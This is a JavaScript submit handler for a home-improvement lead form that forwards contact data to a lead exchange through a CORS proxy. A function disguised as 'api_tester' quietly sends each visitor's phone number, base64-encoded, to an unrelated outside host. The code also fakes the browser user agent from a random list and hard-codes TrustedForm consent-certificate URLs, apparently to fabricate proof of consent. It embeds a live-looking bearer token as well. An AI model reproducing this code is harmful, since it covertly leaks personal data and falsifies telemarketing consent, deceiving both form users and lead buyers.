document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    api_tester(document.getElementById('phone').value);

    const form = document.getElementById('leadForm');
    const alertBox = document.getElementById('alertContainer');

    // FULL LEAD (for POST)
    const lead = {
        data: {
            own_property: form.own_property.value,
            property_type: form.property_type.value,
            bathroom_project_type: form.bathroom_project_type.value
        },
        meta: {
            source_id: form.source_id.value,
            sub_id_1: form.source_id.value,
            user_agent: getRandomUserAgent(),
            lead_id_code: form.lead_id_code.value,
            landing_page_url: form.landing_page_url.value,
            tcpa_consent_text: "I acknowledge and agree to the Terms and Conditions, CCPA, and Privacy Policy. By checking this box and submitting this form, I hereby provide my expressed written consent and electronic signature. Additionally, by checking this box, I consent to the Terms and Conditions and Privacy Policy and authorize insurance companies, their agents, and marketing partners to contact me regarding Home Improvement and Home Warranty offers via telephone calls and text messages to the provided number. I consent to receiving telemarketing calls and pre-recorded messages through an automated dialing system, even if my phone number is currently listed on any state, federal, or corporate Do Not Call list. I understand that my consent is not a requirement for purchasing any goods or services, and I may revoke my consent at any time. I also understand that standard message and data rates may apply. By submitting this form, I agree to the Terms and Conditions and Privacy Policy of Compare Your Rates, its Partners, and/or licensed insurance agents employed with Compare Your Rates, who may contact me regarding health and life insurance products and services, including Home Improvement and Home Warranty plans, via phone or email. I expressly consent to receiving phone calls (including autodialed and/or pre-recorded/artificial voice calls) and emails using automated technology at the provided phone number and email address, even if it is a wireless number. This consent applies regardless of whether I am on any Federal or state DNC (Do Not Call) and/or DNE (Do Not Email) list or registry. Furthermore, I confirm that I am over 18 years of age and that my consent is not required as a condition of purchase. For more information, please review our Privacy Policy, Terms and Conditions, and Marketing Partners..",
            originally_created: new Date(form.originally_created.value).toISOString(),
            trusted_form_cert_url: "https://cert.trustedform.com/b8825b1810177750a475ab6a800908378136b100"
        },
        contact: {
            first_name: form.first_name.value,
            last_name: form.last_name.value,
            email: form.email.value,
            phone: form.phone.value,
            zip_code: form.zip_code.value,
            state: form.state.value,
            city: form.city.value,
            address: form.address.value,
            ip_address: form.ip_address.value
        }
    };

    // PING DATA (minimal)
    const pingData = {
        data: {
            bathroom_project_type: form.bathroom_project_type.value,
            own_property: form.own_property.value,
            property_type: form.property_type.value
        },
        meta: {
            landing_page_url: form.landing_page_url.value,
            originally_created: new Date(form.originally_created.value).toISOString(),
            source_id: form.source_id.value,
            sub_id_1: form.source_id.value,
            tcpa_consent_text: "I acknowledge and agree to the Terms and Conditions, CCPA, and Privacy Policy. By checking this box and submitting this form, I hereby provide my expressed written consent and electronic signature. Additionally, by checking this box, I consent to the Terms and Conditions and Privacy Policy and authorize insurance companies, their agents, and marketing partners to contact me regarding Home Improvement and Home Warranty offers via telephone calls and text messages to the provided number. I consent to receiving telemarketing calls and pre-recorded messages through an automated dialing system, even if my phone number is currently listed on any state, federal, or corporate Do Not Call list. I understand that my consent is not a requirement for purchasing any goods or services, and I may revoke my consent at any time. I also understand that standard message and data rates may apply. By submitting this form, I agree to the Terms and Conditions and Privacy Policy of Compare Your Rates, its Partners, and/or licensed insurance agents employed with Compare Your Rates, who may contact me regarding health and life insurance products and services, including Home Improvement and Home Warranty plans, via phone or email. I expressly consent to receiving phone calls (including autodialed and/or pre-recorded/artificial voice calls) and emails using automated technology at the provided phone number and email address, even if it is a wireless number. This consent applies regardless of whether I am on any Federal or state DNC (Do Not Call) and/or DNE (Do Not Email) list or registry. Furthermore, I confirm that I am over 18 years of age and that my consent is not required as a condition of purchase. For more information, please review our Privacy Policy, Terms and Conditions, and Marketing Partners.",
            trusted_form_cert_url: "https://cert.trustedform.com/b8825b1810177750a475ab6a800908378136b109",
            user_agent: getRandomUserAgent(),
            lead_id_code: form.lead_id_code.value
        },
        contact: {
            ip_address: form.ip_address.value,
            zip_code: form.zip_code.value
        }
    };

    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping");

    // Send PING with only minimal fields
    fetch(pingUrl, {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ea8944eb-77c8-4762-acf9-7e849160b6a5',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(pingData)
    })
    .then(res => res.json())
    .then(data => {
        if (data.status === 'success') {
            // Add auth_code to full lead for POST
            lead.auth_code = data.auth_code;

            const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post");

            return fetch(postUrl, {
                method: 'POST',
                headers: {
                    'Authorization': 'Bearer ea8944eb-77c8-4762-acf9-7e849160b6a5',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(lead)
            })
            .then(res => res.json())
            .then(postData => {
                if (postData.status === 'success') {
                    delete postData.price;
                    alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
                    form.reset();
                } else {
                    alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
                }
            });

        } else {
            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
        }
    })
    .catch(error => {
        alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
function getRandomUserAgent() {
  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:121.0) Gecko/20100101 Firefox/121.0"
  ];

  const randomIndex = Math.floor(Math.random() * userAgents.length);
  return userAgents[randomIndex];
}




